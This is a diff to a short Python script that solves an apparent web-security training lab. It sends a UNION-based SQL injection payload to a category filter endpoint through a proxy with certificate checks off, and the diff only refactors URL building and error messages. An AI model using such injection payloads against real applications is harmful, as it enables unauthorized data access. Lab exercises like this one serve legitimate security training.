@@ -16,20 +16,19 @@ proxies = {
 
 payload = "filter?category=Lifestyle'union+select+null,null,null--"
 
-if url.endswith('.net'):
-    url += f'/{payload}'
-elif url.endswith('.net/'):
-    url += f'{payload}'
-else:
-    print('invalid url')
-    exit(-1)
+def filter_url():
+    global url
+    url = (url.split('.net', 1)[0]) + f'.net/{payload}'
+
+
+filter_url()
+
 
 response = r.get(url, proxies=proxies, verify=False)
 
 if 'Congratulations, you solved the lab!' in response.text:
     print('Lab solved successfully')
+elif response.status_code == 504:
+    print('Lab is not available, please refresh the url')
 else:
-    if response.status_code == 504:
-        print('Lab is not available, please refresh the url')
-    else:
-        print('failed to solve lab, please check you enter valid url')
+    print('failed to solve lab, please check you enter valid url')
